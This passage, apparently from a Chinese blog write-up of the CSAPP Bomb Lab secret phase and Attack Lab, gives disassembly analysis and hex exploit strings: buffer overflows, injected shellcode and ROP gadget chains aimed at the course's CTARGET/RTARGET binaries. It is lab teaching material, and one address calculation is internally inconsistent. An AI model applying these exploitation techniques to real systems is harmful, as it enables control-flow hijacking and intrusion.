&lt;phase_defused&gt;<br>0x0000000000401291 &lt;+79&gt;:    pop    %rbx<br>0x0000000000401292 &lt;+80&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>观察Secret Phase的入口。之前各个Phase中均无入口，由<code>bomb.c</code>中代码可知，每个Phase之后都会执行一次phase_defused函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This phase will never be used, since no one will get past the</span><br><span class="hljs-comment"> * earlier ones.  But just in case, make this one extra hard. */</span><br>input = read_line();<br>phase_6(input);<br>phase_defused();<br></code></pre></td></tr></table></figure>

<p>找到该函数，发现需要的输入仍为6行，进入隐藏关卡的条件与<code>0x402622</code>处的数据有关，且此处输入一共有3个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp<br>0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax<br>0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)<br>0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax<br>0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;<br>0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;<br><br>0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r8<br>0x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx<br>0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx<br>0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi<br>0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi<br>0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax<br>0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;<br><br>0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi<br>0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi<br>0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br><br>0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax<br>0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;<br>0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi<br>0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;<br>0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi<br>0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;<br>0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax<br>0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;<br>0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi<br>0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;<br>0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax<br>0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax<br>0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;<br>0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp<br>0x0000000000401658 &lt;+148&gt;:   ret<br></code></pre></td></tr></table></figure>

<p>读取<code>0x402622</code>处的字符串：</p>
<p><img src="/CSAPP3e_WP/image-20240125163456712-17245034740287.png" style="zoom: 67%;" align="left"></p>



<p>注意到<code>0x402619</code>处的数据，可见字符串<code>&quot;DrEvil&quot;</code>是第3个输入：</p>
<p><img src="/CSAPP3e_WP/image-20240125163756124-17245034725135.png" style="zoom: 67%;" align="left"></p>



<p>在<code>0x4015fa</code>处（<code>sscanf</code>函数）打断点，从文件输入Phase 1~6的答案，观察<code>0x603870</code>处的数据：</p>
<p><img src="/CSAPP3e_WP/image-20240125171715694-17245034630081.png" style="zoom: 67%;" align="left"></p>











<p><code>&quot;DrEvil&quot;</code>输入应该位于 <code>&quot;7 0&quot;</code>之后。</p>
<p>要在<code>secret_phase</code>函数中避开炸弹，需要让调用的<code>fun7</code>函数返回2，传入参数%edi&#x3D;0x6030f0，查看该处附近的数据，发现若干具有两个指针的结构体：</p>
<p><img src="/CSAPP3e_WP/image-20240125175347829-17245034644793.png" style="zoom:67%;" align="left"></p>































<p>检查<code>fun7</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp<br>0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi<br>0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;<br>0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx<br>0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx<br>0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;<br>0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi<br>0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;<br>0x000000000040121c &lt;+24&gt;:    add    %eax,%eax<br>0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;<br>0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax<br>0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx<br>0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;<br>0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi<br>0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;<br>0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax<br>0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;<br>0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax<br>0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp<br>0x0000000000401241 &lt;+61&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>递归调用逻辑为：将当前%rdi处的值%edx与%esi（由<code>secret_phase</code>函数知该值等于输入%ebx）比较，若%edx&gt;%esi，则%rdi自增0x8，并且%eax变为2*%eax；否则%rdi自增0x10，并且%eax变为2*%eax+1。</p>
<p>递归结束条件为：%rdi&#x3D;0(%eax&#x3D;0xffffffff)或%edx&#x3D;%esi，，此时返回值%eax&#x3D;0。</p>
<p>因此可以构造递归调用，由内向外%eax的值分别为0,1,2，%rdi总共自增0x18至<code>0x603270</code>，输入<code>0x14</code>即<strong>20</strong>。</p>
<h2 id="3-Attack-Lab-打开ROP的大门"><a href="#3-Attack-Lab-打开ROP的大门" class="headerlink" title="3. Attack Lab: 打开ROP的大门"></a>3. Attack Lab: 打开ROP的大门</h2><h3 id="Phase-1-1"><a href="#Phase-1-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>执行CTARGET，要求在getbuf返回时执行touch1而非test。</p>
<p>检查getbuf函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>0x00000000004017bd &lt;+21&gt;:    ret<br></code></pre></td></tr></table></figure>

<p><code>Gets</code>缓冲区大小为40个DWord，检查touch1函数，起始地址为<code>0x4017c0</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp<br># ... omitted<br>0x00000000004017e7 &lt;+39&gt;:    call   0x400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>

<p>因此只要在随意填满缓冲区后输入<code>c0 17 40 00 00 00 00 00</code>覆盖返回地址即可，构造输入序列：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span><br><span class="hljs-attribute">32</span> <span class="hljs-number">31</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>a <span class="hljs-number">4</span>b <span class="hljs-number">4</span>c <span class="hljs-number">4</span>d<br><span class="hljs-attribute">00</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>f <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">57</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">5</span>a<br><span class="hljs-attribute">c0</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<h3 id="Phase-2-1"><a href="#Phase-2-1" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>执行CTARGET，要求在getbuf返回时执行touch2而非test，将cookie(<code>0x59b997fa</code>)作为参数传递（存放于%rdi），并且使用 <code>ret</code> 指令将控制转移给touch2。</p>
<p>检查touch2，获取起始地址为<code>0x4017ec</code>，将其压栈后使用使用 <code>ret</code> 指令转移控制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017ec &lt;+0&gt;:     sub    $0x8,%rsp<br># ... omitted<br>0x0000000000401847 &lt;+91&gt;:    call   0x400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>

<p>构造以下代码完成操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq  $0x59b997fa, %rdi<br>pushq $0x4017ec<br>ret<br></code></pre></td></tr></table></figure>

<p>接下来确定%rsp，在getbuf函数中的相关操作如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br></code></pre></td></tr></table></figure>

<p>在<code>0x4017ac</code>处打断点得到%rsp：</p>
<p><img src="/CSAPP3e_WP/image-20240129095931505-172450353221319.png" style="zoom:67%;" align="left"></p>













<p>得到输入序列（注入指令与返回地址之间的部分随意输入）：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">02</span> <span class="hljs-number">02</span> <span class="hljs-number">02</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">03</span> <span class="hljs-number">03</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<h3 id="Phase-3-1"><a href="#Phase-3-1" class="headerlink" title="Phase 3"></a>Phase 3</h3><p>执行CTARGET，要求在getbuf返回时执行touch3而非test，将cookie的字符串形式(<code>&quot;35 39 62 39 39 37 66 61&quot;</code>)作为参数，返回地址存放于%rdi。</p>
<p>检查touch3，获取起始地址为<code>0x4018fa</code>，将其压栈后使用使用 <code>ret</code> 指令转移控制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004018fa &lt;+0&gt;:     push   %rbx<br># ... omitted<br>0x0000000000401963 &lt;+105&gt;:   call   0x400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>

<p>缓冲区和返回地址一共占用48个DWord，为了使字符串不被覆盖，计算cookie字符串的地址为<code>0x5561dca8</code>+ <code>0x30</code>&#x3D;<code>0x5561dca8</code>，构造以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq  $0x5561dca8, %rdi<br>pushq $0x4018fa<br>ret<br></code></pre></td></tr></table></figure>

<p>得到输入序列（注入指令与返回地址之间的部分随意输入）：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">30</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">34</span> <span class="hljs-number">35</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure>

<h3 id="Phase-4-1"><a href="#Phase-4-1" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>执行RTARGET，RTARGET设置了栈随机化，且栈区内存不可执行。Phase 4返回要求与Phase 2相同（在getbuf返回时执行touch2）。</p>
<p>获取<code>farm.c</code>中的gadget：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c -Og farm.c<br>objdump -d farm.o &gt; farm_ins.d<br></code></pre></td></tr></table></figure>

<p>需要实现将cookie放到%rdi并传递给touch2，即以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq %rax<br>movq %rax, %rdi<br>ret<br></code></pre></td></tr></table></figure>

<p>可用的gadget如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000000000 &lt;start_farm&gt;:<br>   0:	f3 0f 1e fa          	endbr64<br>   4:	b8 01 00 00 00       	mov    $0x1,%eax<br>   9:	c3                   	ret<br><br>000000000000000a &lt;getval_142&gt;:<br>   a:	f3 0f 1e fa          	endbr64<br>   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax<br>  13:	c3                   	ret<br><br>0000000000000014 &lt;addval_273&gt;:<br>  14:	f3 0f 1e fa          	endbr64<br>  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax<br>  1e:	c3                   	ret<br><br>000000000000001f &lt;addval_219&gt;:<br>  1f:	f3 0f 1e fa          	endbr64<br>  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax<br>  29:	c3                   	ret<br><br>000000000000002a &lt;setval_237&gt;:<br>  2a:	f3 0f 1e fa          	endbr64<br>  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)<br>  34:	c3                   	ret<br><br>0000000000000035 &lt;setval_424&gt;:<br>  35:	f3 0f 1e fa          	endbr64<br>  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)<br>  3f:	c3                   	ret<br><br>0000000000000040 &lt;setval_470&gt;:<br>  40:	f3 0f 1e fa          	endbr64<br>  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)<br>  4a:	c3                   	ret<br><br>000000000000004b &lt;setval_426&gt;:<br>  4b:	f3 0f 1e fa          	endbr64<br>  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)<br>  55:	c3                   	ret<br><br>0000000000000056 &lt;getval_280&gt;:<br>  56:	f3 0f 1e fa          	endbr64<br>  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax<br>  5f:	c3                   	ret<br><br>0000000000000060 &lt;mid_farm&gt;:<br>  60:	f3 0f 1e fa          	endbr64<br>  64:	b8 01 00 00 00       	mov    $0x1,%eax<br>  69:	c3                   	ret<br></code></pre></td></tr></table></figure>

<p><code>popq %rax</code>编码为<code>58</code>，在函数<code>getval_280</code>中，反编译得到起始地址为<code>0x4019ca</code>，<code>popq %rax</code>指令地址为<code>0x4019cc</code>，该指令之后为<code>ret</code>指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004019ca &lt;+0&gt;:     mov    $0xc3905829,%eax<br>0x00000000004019cf &lt;+5&gt;:     ret<br></code></pre></td></tr></table></figure>

<p><code>movq %rax,%rdi</code>编码为<code>48 89 c7</code>，在函数<code>addval_273</code>中，反编译得到起始地址为<code>0x4019a0</code>，<code>movq %rax,%rdi</code>指令地址为<code>0x4019a2</code>，该指令之后为<code>ret</code>指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004019a0 &lt;+0&gt;:     lea    -0x3c3876b8(%rdi),%eax<br>0x00000000004019a6 &lt;+6&gt;:     ret<br></code></pre></td></tr></table></figure>

<p>构造输入序列，随意填满缓冲区，然后设置返回地址及参数cookie(<code>0x59b997fa</code>)：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span><br><span class="hljs-attribute">32</span> <span class="hljs-number">31</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>a <span class="hljs-number">4</span>b <span class="hljs-number">4</span>c <span class="hljs-number">4</span>d<br><span class="hljs-attribute">00</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>f <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">33</span> <span class="hljs-number">33</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">57</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">5</span>a<br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<h3 id="Phase-5-1"><a href="#Phase-5-1" class="headerlink" title="Phase 5"></a>Phase 5</h3><p>执行RTARGET，Phase 5返回要求与Phase 3相同（在getbuf返回时执行touch3）。</p>
<p>存放字符串的地址需要计算以%rsp为基准的偏移量，找一个利用加法的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000000042 &lt;add_xy&gt;:<br>  42:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax<br>  46:	c3                   	retq   <br></code></pre></td></tr></table></figure>

<p>Phase 5需要实现以下功能：</p>
<p>·将%rsp装入%rdi</p>
<p>·将偏移量装入%rsi</p>
<p>·计算%rax&#x3D;%rdi+%rsi，将返回值装入%rdi</p>
<p>和Phase 4类似，在获取的gadget中寻找以下指令序列，需要执行的指令和<code>ret</code>之间可以含有若干个<code>nop</code>指令：</p>
<p><code>&lt; addval_190 +3 &gt;</code>处<code>48 89 e0</code> (<code>movq %rsp, %rax</code>)，</p>
<p><code>&lt; addval_273 +2 &gt;</code>处<code>48 89 c7</code> (<code>movq %rax, %rdi</code>),</p>
<p><code>&lt; getval_280 +2 &gt;</code>处<code>58</code>(<code>popq %rax</code>),</p>
<p><code>popq %rax</code>后存放字符串首地址的偏移量(不超过32位二进制数范围)，考虑之后的指令，可将偏移量从%eax装入%esi：</p>
<p><code>&lt; getval_481 +2 &gt;</code>处<code>89 c2</code>(<code>movl %eax, %edx</code>),</p>
<p><code>&lt; getval_159 +1 &gt;</code>处<code>89 d1</code>(<code>movl %edx, %ecx</code>),</p>
<p><code>&lt; addval_436 +2 &gt;</code>处<code>89 ce</code>(<code>movl %ecx, %esi</code>),</p>
<p>随后执行：</p>
<p><code>&lt; add_xy &gt; </code>处<code>48 8d 04 37</code>(<code>lea (%rdi,%rsi,1),%rax</code>),</p>
<p><code>&lt; addval_273 +2 &gt;</code>处<code>48 89 c7</code> (<code>movq %rax, %rdi</code>)。</p>
<p>下一行为touch3的起始地址，反编译得到所需输入如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># buffer end</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-comment"># offset</span><br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">34</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 